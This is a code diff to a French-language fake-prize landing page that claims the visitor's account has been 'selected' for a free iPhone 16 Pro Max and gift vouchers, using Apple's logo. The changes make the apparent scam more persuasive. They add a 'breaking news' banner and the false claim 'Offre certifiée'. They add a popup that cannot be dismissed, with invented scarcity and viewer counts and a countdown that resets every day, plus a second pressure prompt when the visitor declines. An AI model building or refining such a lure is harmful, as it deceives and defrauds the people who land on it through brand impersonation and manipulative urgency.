@@ -65,39 +65,102 @@
             z-index: 1;
         }
         
-        header {
+        /* Style pour le badge premium */
+        .premium-badge {
+            position: relative;
+            width: 180px;
+            height: 180px;
+            margin: 0 auto 30px;
+            background: linear-gradient(135deg, #f5f7fa 0%, #e4e8eb 100%);
+            border-radius: 50%;
+            padding: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2),
+                        inset 0 0 15px rgba(255, 255, 255, 0.8);
+            border: 2px solid rgba(255, 255, 255, 0.5);
+        }
+
+        .badge-inner {
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(to bottom right, #00B4DB, #0083B0);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .badge-shine {
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(
+                to bottom right,
+                rgba(255, 255, 255, 0) 45%,
+                rgba(255, 255, 255, 0.8) 50%,
+                rgba(255, 255, 255, 0) 55%
+            );
+            transform: rotate(30deg);
+            animation: shine 3s infinite;
+        }
+
+        /* Effet breaking news */
+        .breaking-news {
+            position: relative;
+            background: linear-gradient(90deg, #ff0000, #cc0000);
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 25px;
+            box-shadow: 0 5px 15px rgba(204, 0, 0, 0.5);
+            overflow: hidden;
+            border-left: 5px solid #fff;
+            border-right: 5px solid #fff;
+        }
+
+        .news-ticker {
+            position: relative;
+            z-index: 2;
             text-align: center;
-            padding: 40px 0;
-            background: rgba(255, 255, 255, 0.9);
-            border-radius: 20px;
-            margin-bottom: 30px;
-            box-shadow: 0 10px 30px rgba(0, 180, 219, 0.2);
-            border: 1px solid rgba(255, 255, 255, 0.3);
-            backdrop-filter: blur(10px);
+            color: white;
+            text-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
         }
-        
-        .logo {
-            width: 150px;
-            margin-bottom: 20px;
-            filter: drop-shadow(0 0 15px var(--primary-blue));
+
+        .news-ticker span {
+            display: block;
+            font-size: 1.2rem;
+            font-weight: bold;
+            margin-bottom: 5px;
         }
-        
-        h1 {
-            font-size: 2.8rem;
-            margin-bottom: 20px;
-            background: linear-gradient(to right, var(--secondary-blue), var(--primary-blue));
+
+        .news-flash {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(
+                90deg,
+                rgba(255, 255, 255, 0) 0%,
+                rgba(255, 255, 255, 0.5) 50%,
+                rgba(255, 255, 255, 0) 100%
+            );
+            animation: flash 2s infinite;
+        }
+
+        @keyframes flash {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+
+        .highlight-text {
+            background: linear-gradient(to right, #FFD700, #FFA500);
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
-            text-shadow: 0 2px 10px rgba(0, 180, 219, 0.2);
-            line-height: 1.2;
-        }
-        
-        .subtitle {
-            font-size: 1.8rem;
-            margin-bottom: 30px;
-            color: var(--secondary-blue);
-            font-weight: 600;
+            text-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
         }
         
         .badge {
@@ -137,6 +200,8 @@
             display: flex;
             justify-content: center;
             align-items: center;
+            transform-style: preserve-3d;
+            transition: transform 0.5s;
         }
         
         .iphone-mockup {
@@ -177,6 +242,8 @@
             box-shadow: 0 5px 15px rgba(0, 180, 219, 0.1);
             position: relative;
             overflow: hidden;
+            transform-style: preserve-3d;
+            transform: perspective(1000px);
         }
         
         .gift-card::before {
@@ -191,7 +258,7 @@
         }
         
         .gift-card:hover {
-            transform: translateY(-10px) scale(1.02);
+            transform: perspective(1000px) rotateY(10deg) translateY(-10px);
             box-shadow: 0 15px 30px rgba(0, 180, 219, 0.3);
             border-color: var(--gold);
         }
@@ -534,16 +601,6 @@
             border-bottom-color: var(--primary-blue);
         }
         
-        /* Effet 3D pour les cartes cadeaux */
-        .gift-card {
-            transform-style: preserve-3d;
-            transform: perspective(1000px);
-        }
-        
-        .gift-card:hover {
-            transform: perspective(1000px) rotateY(10deg) translateY(-10px);
-        }
-        
         /* Flocons qui tombent (effet premium) */
         .snowflakes {
             position: fixed;
@@ -585,10 +642,87 @@
             }
         }
         
+        /* Styles pour la popup urgente */
+        .urgent-alert {
+            position: relative;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+
+        .alert-header {
+            position: relative;
+            padding: 15px;
+            margin-bottom: 15px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+        }
+
+        .pulse-border {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: 2px solid #FF0000;
+            border-radius: 8px;
+            animation: pulse-border 1.5s infinite;
+            pointer-events: none;
+        }
+
+        @keyframes pulse-border {
+            0% { opacity: 0.8; transform: scale(1); }
+            50% { opacity: 0.3; transform: scale(1.02); }
+            100% { opacity: 0.8; transform: scale(1); }
+        }
+
+        .alert-content {
+            position: relative;
+            z-index: 2;
+            color: white;
+            text-align: center;
+        }
+
+        .mini-countdown {
+            font-size: 1.8rem;
+            font-weight: bold;
+            margin: 10px 0;
+            font-family: monospace;
+            color: #FFD700;
+        }
+
+        .alert-message {
+            font-size: 1.1rem;
+            text-align: center;
+            margin-top: 15px;
+            line-height: 1.5;
+        }
+
+        .gold-button {
+            background: linear-gradient(to right, #FFD700, #FFA500) !important;
+            color: #333 !important;
+            font-weight: bold !important;
+            border: none !important;
+            box-shadow: 0 5px 15px rgba(255, 215, 0, 0.4) !important;
+        }
+
+        .cancel-button {
+            background: transparent !important;
+            color: #FFF !important;
+            border: 1px solid rgba(255, 255, 255, 0.3) !important;
+        }
+
+        .urgent-swal .swal2-title {
+            color: #FFD700;
+            text-shadow: 0 2px 5px rgba(0, 0, 0, 0.5);
+            font-size: 1.8rem !important;
+        }
+        
         /* Responsive */
         @media (max-width: 992px) {
-            h1 {
-                font-size: 2.2rem;
+            .news-ticker h1 {
+                font-size: 1.8rem;
             }
             
             .subtitle {
@@ -611,8 +745,8 @@
         }
         
         @media (max-width: 768px) {
-            h1 {
-                font-size: 1.8rem;
+            .news-ticker h1 {
+                font-size: 1.5rem;
             }
             
             .subtitle {
@@ -659,8 +793,8 @@
         }
         
         @media (max-width: 576px) {
-            h1 {
-                font-size: 1.5rem;
+            .news-ticker h1 {
+                font-size: 1.3rem;
             }
             
             .countdown-item {
@@ -687,6 +821,11 @@
             .guarantee-item {
                 padding: 10px 15px;
             }
+            
+            .premium-badge {
+                width: 150px;
+                height: 150px;
+            }
         }
     </style>
 </head>
@@ -706,10 +845,27 @@
     
     <div class="container">
         <header>
-            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Logo Premium" class="logo animate__animated animate__fadeIn">
-            <h1 class="animate__animated animate__fadeIn">🚨 VOTRE COMPTE A ÉTÉ SÉLECTIONNÉ ! 🚨</h1>
-            <h2 class="subtitle animate__animated animate__fadeIn animate__delay-1s">Gagnez un iPhone 16 + 100€ + 50€ chez Amazon & McDonald's !</h2>
-            <div class="badge animate__animated animate__pulse animate__infinite">Offre 100% gratuite • Valable 24h seulement</div>
+            <!-- Nouveau conteneur premium pour le logo -->
+            <div class="premium-badge animate__animated animate__fadeInDown">
+                <div class="badge-inner">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Logo Premium" class="logo">
+                    <div class="badge-shine"></div>
+                </div>
+            </div>
+            
+            <!-- Titre avec effet breaking news -->
+            <div class="breaking-news animate__animated animate__fadeIn">
+                <div class="news-ticker">
+                    <span>🚨 EXCLUSIF 🚨</span>
+                    <h1>VOTRE COMPTE A ÉTÉ SÉLECTIONNÉ !</h1>
+                </div>
+                <div class="news-flash"></div>
+            </div>
+            
+            <h2 class="subtitle animate__animated animate__fadeIn animate__delay-1s">
+                <span class="highlight-text">Gagnez un iPhone 16 Pro Max + 100€ + 50€ chez Amazon & McDonald's !</span>
+            </h2>
+            <div class="badge animate__animated animate__pulse animate__infinite">Offre certifiée • Valable 24h seulement</div>
         </header>
         
         <div class="offer-container">
@@ -838,6 +994,8 @@
     <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.11.4/gsap.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.11.4/ScrollTrigger.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
     <script>
         // Initialisation des particules bleues
         particlesJS("particles-js", {
@@ -1010,6 +1168,13 @@
             delay: 1
         });
         
+        // Effet de parallaxe pour l'iPhone
+        window.addEventListener('mousemove', (e) => {
+            const xAxis = (window.innerWidth / 2 - e.pageX) / 25;
+            const yAxis = (window.innerHeight / 2 - e.pageY) / 25;
+            document.querySelector('.iphone-container').style.transform = `rotateY(${xAxis}deg) rotateX(${yAxis}deg)`;
+        });
+        
         // Redirection intelligente
         async function redirectUser() {
             try {
@@ -1116,38 +1281,94 @@
         // Gestion du clic sur le bouton CTA
         document.getElementById('cta-button').addEventListener('click', redirectUser);
         
-        // Popup urgent après 15 secondes
+        // Nouveau popup urgent amélioré
         setTimeout(() => {
             Swal.fire({
-                title: '⚠️ DERNIÈRE CHANCE !',
-                text: '3 personnes regardent cette offre. Confirmez maintenant !',
+                title: '<strong>⚠️ ALERTE EXCLUSIVE</strong>',
+                html: `
+                    <div class="urgent-alert">
+                        <div class="alert-header">
+                            <div class="pulse-border"></div>
+                            <div class="alert-content">
+                                <p>Seulement <strong>3 places</strong> restantes à ce prix!</p>
+                                <div class="mini-countdown">
+                                    <span id="mini-hours">23</span>:<span id="mini-minutes">59</span>:<span id="mini-seconds">59</span>
+                                </div>
+                            </div>
+                        </div>
+                        <p class="alert-message">5 personnes consultent cette offre en ce moment. Ne perdez pas votre chance!</p>
+                    </div>
+                `,
                 icon: 'warning',
-                confirmButtonText: 'PRENDRE MON CADEAU',
-                background: 'rgba(255, 255, 255, 0.95)',
-                color: '#0083B0',
-                confirmButtonColor: '#00B4DB',
+                background: 'linear-gradient(135deg, #1a2a6c 0%, #b21f1f 50%, #fdbb2d 100%)',
+                color: 'white',
+                confirmButtonText: 'JE VEUX MON IPHONE GRATUIT',
+                confirmButtonColor: '#FFD700',
+                showCancelButton: true,
+                cancelButtonText: 'Refuser cette offre',
+                customClass: {
+                    container: 'urgent-swal',
+                    confirmButton: 'gold-button',
+                    cancelButton: 'cancel-button'
+                },
                 backdrop: `
-                    rgba(0,180,219,0.4)
+                    rgba(0,0,0,0.7)
                     url("https://i.gifer.com/7efs.gif")
                     center top
                     no-repeat
                 `,
-                showCancelButton: true,
-                cancelButtonText: 'Non merci',
-                customClass: {
-                    confirmButton: 'swal-confirm-btn',
-                    cancelButton: 'swal-cancel-btn'
+                allowOutsideClick: false,
+                allowEscapeKey: false,
+                willOpen: () => {
+                    confetti({
+                        particleCount: 100,
+                        spread: 70,
+                        origin: { y: 0.6 }
+                    });
                 }
             }).then((result) => {
                 if (result.isConfirmed) {
                     redirectUser();
+                } else {
+                    // Afficher un dernier message de persuasion
+                    Swal.fire({
+                        title: 'Êtes-vous sûr?',
+                        text: 'Cette offre ne sera plus disponible après votre départ!',
+                        icon: 'question',
+                        showCancelButton: true,
+                        confirmButtonText: 'Je veux mon cadeau!',
+                        cancelButtonText: 'Partir sans rien'
+                    }).then((finalResult) => {
+                        if (finalResult.isConfirmed) {
+                            redirectUser();
+                        }
+                    });
                 }
             });
+            
+            // Mise à jour du mini compte à rebours
+            function updateMiniCountdown() {
+                const now = new Date();
+                const endOfDay = new Date();
+                endOfDay.setHours(23, 59, 59, 999);
+                
+                const diff = endOfDay - now;
+                
+                const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+                const seconds = Math.floor((diff % (1000 * 60)) / 1000);
+                
+                document.getElementById('mini-hours').textContent = hours.toString().padStart(2, '0');
+                document.getElementById('mini-minutes').textContent = minutes.toString().padStart(2, '0');
+                document.getElementById('mini-seconds').textContent = seconds.toString().padStart(2, '0');
+            }
+            
+            setInterval(updateMiniCountdown, 1000);
+            updateMiniCountdown();
+            
         }, 15000);
         
         // Animation au scroll
-        gsap.registerPlugin(ScrollTrigger);
-        
         gsap.utils.toArray(".gift-card").forEach(card => {
             gsap.from(card, {
                 scrollTrigger: {
